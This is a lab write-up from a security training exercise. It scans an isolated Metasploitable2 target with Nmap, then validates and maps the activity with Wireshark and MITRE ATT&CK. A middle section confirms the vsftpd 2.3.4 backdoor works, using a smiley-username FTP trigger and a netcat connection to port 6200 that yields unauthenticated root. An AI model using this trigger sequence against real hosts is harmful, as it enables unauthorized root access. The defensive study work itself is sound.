# Scenario 1: Network Reconnaissance and Port Scanning

## Objective

Simulate an attacker's initial reconnaissance phase by scanning the isolated target (Metasploitable2) from Kali Linux, then detect and validate that activity using Splunk and Wireshark, and map it to MITRE ATT&CK.

## Lab Prerequisites

- Kali Linux and Metasploitable2 powered on and reachable over the "labnet" internal network only
- Static IPs confirmed on both machines (Kali IP resets on reboot — re-set before starting)
- Splunk running and able to ingest target-side logs
- Wireshark capture running on the labnet interface before the scan starts, not after
- Nmap installed on Kali

## Controlled Test Procedure

1. Wireshark capture started on eth0 (labnet interface).
2. Combined TCP connect and service/version scan run from Kali (192.168.50.10) against Metasploitable2 (192.168.50.20):

```
nmap -sT -sV 192.168.50.20
```

3. Capture stopped after scan completion and saved as `scenario1-portscan.pcapng` (stored in `~/Documents/` on Kali).

**Full command output:**

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-18 19:38 -0400
Nmap scan report for 192.168.50.20
Host is up (0.00071s latency).
Not shown: 977 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:B9:CA:24 (Oracle VirtualBox virtual NIC)
Service Info: Hosts: metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
```

**Notable finding worth flagging in your analysis:** three of these services are known-backdoored by design on Metasploitable2, not something the scan itself caused:
- Port 21 — vsftpd 2.3.4 has a well-documented backdoor (CVE-2011-2523) — **confirmed exploitable, see below**
- Port 6667 — this UnrealIRCd build has a well-documented backdoor (CVE-2010-2075)
- Port 1524 — a root shell is already listening here (`bindshell`), meaning no exploitation is even required to get a shell on this box

Call this out explicitly in your writeup — recognizing that a scan revealed pre-existing backdoors, not just open ports, is a stronger analytical point than just listing services.

## vsftpd 2.3.4 Backdoor Confirmation (CVE-2011-2523)

Tested directly from Kali against the target's FTP service (port 21) using the documented trigger method: sending a username containing the string `:)`, followed by a connection attempt to port 6200.

**Trigger command:**
```
ftp 192.168.50.20
Name: rithika:)
Password: [any value, login itself fails/is irrelevant]
```

**Verification command (separate terminal):**
```
nc 192.168.50.20 6200
```

**Result across four attempts:** three returned `Connection refused`; the fourth succeeded, dropping directly into a shell with no authentication prompt. Confirmed with:

```
whoami
root
hostname
metasploitable
id
uid=0(root) gid=0(root)
```

This confirms full, unauthenticated root access on the target via this backdoor. The inconsistency across attempts (3 failures, 1 success) suggests the malicious code path is timing-sensitive rather than unreliable by design — worth noting as a real observed behavior, not something documented in the original CVE writeups, which don't mention a reliability issue.

## Logs and Evidence to Collect

- Wireshark .pcap file of the full scan window
- Target-side connection logs (if Metasploitable2 logs incoming connections — confirm what's actually available; Metasploitable2 doesn't log much by default, so this may rely mainly on the pcap and any firewall/pfSense logs if in use)
- Nmap scan output (text or XML)
- Splunk search results screenshot

## Wireshark Analysis Filters

- `ip.addr == 192.168.50.10 && ip.addr == 192.168.50.20` — isolate the conversation between attacker and target
- `tcp.flags.syn == 1 && tcp.flags.ack == 0` — isolate SYN packets, useful for spotting scan patterns

**Confirmed:** applying `ip.addr==192.168.50.20 && tcp.flags.syn==1 && tcp.flags.ack==0` against the saved capture shows a burst of SYN packets from 192.168.50.10 to 192.168.50.20 starting roughly 2.6 seconds into the capture, spread across many destination ports in non-sequential order — consistent with Nmap's default port-randomization behavior and matching the 1000-port scan reported in the terminal output above.

## Splunk Investigation Workflow

Splunk correlation was not pursued for this scenario. Metasploitable2 does not log incoming connection attempts by default, and no additional log source (firewall, IDS, or a Wireshark-to-Splunk export as was later done for Scenario 4) was introduced to capture this activity. This is a deliberate scope decision: detection and validation for this scenario relied on Wireshark packet-level analysis and direct Nmap output, which together provide sufficient evidence for the finding. The Splunk/SIEM detection skillset is demonstrated in Scenarios 2 and 4 instead.

## Working SPL Queries

Not applicable to this scenario — see note above.

## Investigation Questions

- **What is the earliest indicator that a scan is occurring, versus normal traffic?** The Nmap output itself is attacker-side proof, not a detection — the actual defender-side indicator is the Wireshark capture. Open your saved `scenario1-portscan.pcapng` and confirm you see a burst of SYN packets from 192.168.50.10 to 192.168.50.20 across many destination ports within the 15.32-second window.
- **How many unique ports were touched, and over what time window?** Nmap's default top-1000-port list was probed (23 came back open, 977 closed) in 15.32 seconds — roughly 65 ports per second.
- **Does the scan pattern in Wireshark match what Nmap reported it sent?** Confirmed. Applying the filter `ip.addr==192.168.50.20 && tcp.flags.syn==1 && tcp.flags.ack==0` shows a burst of SYN packets from 192.168.50.10 to 192.168.50.20 starting roughly 2.6 seconds into the capture, hitting a wide spread of destination ports (21, 22, 110, 111, 139, 143, 199, 256, 445, 554, 993, 995, 1025, 1720, 1723, 3306, 5900, and others) — consistent with the 1000-port scan Nmap reported. The destination ports are not sequential, which matches Nmap's default behavior of randomizing scan order.
- **Would this scan pattern be distinguishable from a legitimate service discovery tool on a real network?** `-sT` is a full TCP connect scan (completes the three-way handshake), which is by design harder to distinguish from a normal application connecting than a stealth `-sS` SYN scan would be. The distinguishing signal here is volume and speed — 65 ports/sec against nearly every well-known port in 15 seconds is not something a normal client does.

## Indicators of Compromise

| Type | Value | Notes |
|---|---|---|
| Source IP | 192.168.50.10 | Kali attacker IP |
| Scan pattern | 1000 ports probed (top-1000 default list), 23 open / 977 closed, completed in 15.32 seconds (~65 ports/sec) | TCP connect scan (`-sT`), full three-way handshake per port |
| Exposed backdoored services | vsftpd 2.3.4 (port 21, CVE-2011-2523), UnrealIRCd (port 6667, CVE-2010-2075), root bindshell already listening (port 1524) | Pre-existing on Metasploitable2, not caused by the scan — but discovered by it |

## Timeline

| Time (UTC-4) | Event |
|---|---|
| ~19:38, 2026-07-18 | Wireshark capture started on eth0 |
| 19:38:00 (approx) | `nmap -sT -sV 192.168.50.20` initiated |
| 19:38:15 (approx) | Nmap scan completed — 15.32 second duration confirmed in output |
| ~19:38:15, 2026-07-18 (approx, immediately following scan completion) | Wireshark capture stopped and saved as `scenario1-portscan.pcapng` |

## True Positive / False Positive Assessment

True positive by design — this was a deliberate, controlled scan run by the lab operator. In a real environment, this would be distinguished from a false positive (e.g. a scheduled internal vulnerability scanner like Nessus or Qualys) by checking whether the source IP is on an approved scanner allowlist and whether the timing matches a known scan schedule.

## MITRE ATT&CK Mapping

| Technique ID | Name | Justification |
|---|---|---|
| T1595 | Active Scanning | Nmap actively probed 192.168.50.20 across 1000 ports to identify live services prior to any exploitation attempt |
| T1046 | Network Service Discovery | The `-sV` flag performed service and version detection against every open port, fingerprinting exact software versions |

## Remediation Recommendations

**Problem:** During testing, the port scan revealed 23 open ports, including the backdoored vsftpd FTP service on port 21 and the pre-existing root bindshell on port 1524, with no detection or alerting in place. The environment also contained an UnrealIRCd backdoor on port 6667, although that service wasn't exploited during this scenario.

**Why it matters:** If this scan had been run by a real attacker instead of during a controlled test, they could have immediately identified exposed services, matched software versions to known vulnerabilities, and discovered pre-existing backdoors with almost no effort. This is realistic because reconnaissance and port scanning are typically the first stage of an attack, and this host exposed significantly more services and version information than a hardened production server should.

**Fix:** Reduce the exposed attack surface by removing or patching vulnerable and backdoored services, restricting unnecessary ports with firewall rules, and deploying monitoring such as IDS/IPS or SIEM detections to identify reconnaissance activity like port scans.

## Status

Complete: Nmap scan executed and documented, Wireshark validation confirmed against the actual capture, vsftpd backdoor exploitation confirmed with root access, remediation drafted. Splunk correlation intentionally not pursued for this scenario (see note above).
